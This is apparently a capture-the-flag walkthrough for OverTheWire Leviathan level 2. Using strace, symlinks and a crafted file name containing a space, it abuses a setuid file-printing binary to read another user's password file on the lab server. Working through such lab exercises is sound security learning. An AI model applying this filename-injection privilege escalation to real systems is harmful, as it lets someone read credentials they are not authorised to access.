---
title: "Level 2"
---

* Login : ssh leviathan2@leviathan.labs.overthewire.org -p 2223

In the home directory, you'll find a `setuid ELF` called `printfile`. This is a preview of what happens when you run it :
```bash
leviathan2@leviathan:~$ ./printfile 
*** File Printer ***
Usage: ./printfile filename
leviathan2@leviathan:~$
```
Okay so it's basically a custom `cat` command. When you check who owns it, it says it's `owned` by `user leviathan3` and belongs to `leviathan2 group`. I of course tried ./printfile /etc/leviathan_pass/leviathan3 but it told me `you can't have that file` but for other files it said `cat: Permission Denied`.

```bash
leviathan2@leviathan:~$ strace ./printfile /etc/leviathan_pass/leviathan3
execve("./printfile", ["./printfile", "/etc/leviathan_pass/leviathan3"], 0x7fffffffe338 /* 28 vars */) = 0
[ Process PID=367 runs in 32 bit mode. ]
brk(NULL)                               = 0x804d000
fcntl64(0, F_GETFD)                     = 0
fcntl64(1, F_GETFD)                     = 0
fcntl64(2, F_GETFD)                     = 0
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7fbb000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 3
statx(3, "", AT_STATX_SYNC_AS_STAT|AT_NO_AUTOMOUNT|AT_EMPTY_PATH, STATX_BASIC_STATS, {stx_mask=STATX_BASIC_STATS|STATX_MNT_ID, stx_attributes=0, stx_mode=S_IFREG|0644, stx_size=52371, ...}) = 0
mmap2(NULL, 52371, PROT_READ, MAP_PRIVATE, 3, 0) = 0xf7fae000
close(3)                                = 0
openat(AT_FDCWD, "/usr/lib32/libc.so.6", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 3
read(3, "\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20b\2\0004\0\0\0"..., 512) = 512
statx(3, "", AT_STATX_SYNC_AS_STAT|AT_NO_AUTOMOUNT|AT_EMPTY_PATH, STATX_BASIC_STATS, {stx_mask=STATX_BASIC_STATS|STATX_MNT_ID, stx_attributes=0, stx_mode=S_IFREG|0755, stx_size=2323100, ...}) = 0
mmap2(NULL, 2361468, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xf7d6d000
mmap2(0xf7d91000, 1622016, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x24000) = 0xf7d91000
mmap2(0xf7f1d000, 540672, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1b0000) = 0xf7f1d000
mmap2(0xf7fa1000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x233000) = 0xf7fa1000
mmap2(0xf7fa4000, 39036, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xf7fa4000
close(3)                                = 0
set_thread_area({entry_number=-1, base_addr=0xf7fbc580, limit=0x0fffff, seg_32bit=1, contents=0, read_exec_only=0, limit_in_pages=1, seg_not_present=0, useable=1}) = 0 (entry_number=12)
set_tid_address(0xf7fbc7a0)             = 367
set_robust_list(0xf7fbc5ec, 12)         = 0
rseq(0xf7fbc4c0, 0x21, 0, 0x53053053)   = 0
mprotect(0xf7fa1000, 8192, PROT_READ)   = 0
mprotect(0x804b000, 4096, PROT_READ)    = 0
mprotect(0xf7ffb000, 8192, PROT_READ)   = 0
ugetrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
getrandom("\x81\xd6\xcd\x19", 4, GRND_NONBLOCK) = 4
munmap(0xf7fae000, 52371)               = 0
access("/etc/leviathan_pass/leviathan3", R_OK) = -1 EACCES (Permission denied)
statx(1, "", AT_STATX_SYNC_AS_STAT|AT_NO_AUTOMOUNT|AT_EMPTY_PATH, STATX_BASIC_STATS, {stx_mask=STATX_BASIC_STATS|STATX_MNT_ID, stx_attributes=0, stx_mode=S_IFCHR|0620, stx_size=0, ...}) = 0
brk(NULL)                               = 0x804d000
brk(0x806e000)                          = 0x806e000
brk(0x806f000)                          = 0x806f000
write(1, "You cant have that file...\n", 27You cant have that file...
) = 27
exit_group(1)                           = ?
+++ exited with 1 +++
leviathan2@leviathan:~$ 
```

In the strace output, you can see it's checking if `the user` performing the command has `permission` to view the file, if `yes` it passes it to /bin/cat with `leviathan3 privilages`, if not, it says you can't have that file.

So, to bypass this, let's try to create a link file. Let's say the file is called `password`. If you try this, it'll point the access() to the file you're pointed to meaning /etc/leviathan_pass/leviathan3 and will deny your request. BUT, if you create a file with a space in it, let's call it `leviathan password` and pass THAT to `printfile` then its a different story : 
```bash
leviathan2@leviathan:/tmp/tmp.GOaN9hbFZU$ ~/printfile leviathan\ password
```
The access checks if your UID is allowed to the file `leviathan password`, which yes because you created it, and then the cat command will try to cat leviathan and cat password as two seperate file and thus you'll get the password.

**NOTE** : make sure to get complete permissions in your temporary directory `chmod 777`.

```bash 
leviathan2@leviathan:/tmp/tmp.GOaN9hbFZU$ ls -l
total 0
-rw-rw-r-- 1 leviathan2 leviathan2  0 Oct 23 19:51 leviathan password
lrwxrwxrwx 1 leviathan2 leviathan2 30 Oct 23 19:51 password -> /etc/leviathan_pass/leviathan3
leviathan2@leviathan:/tmp/tmp.GOaN9hbFZU$ ~/printfile password 
You cant have that file...
leviathan2@leviathan:/tmp/tmp.GOaN9hbFZU$ ~/printfile leviathan\ password 
##PASSWORD REDACTED###
cat: leviathan: No such file or directory
leviathan2@leviathan:/tmp/tmp.GOaN9hbFZU$ 
```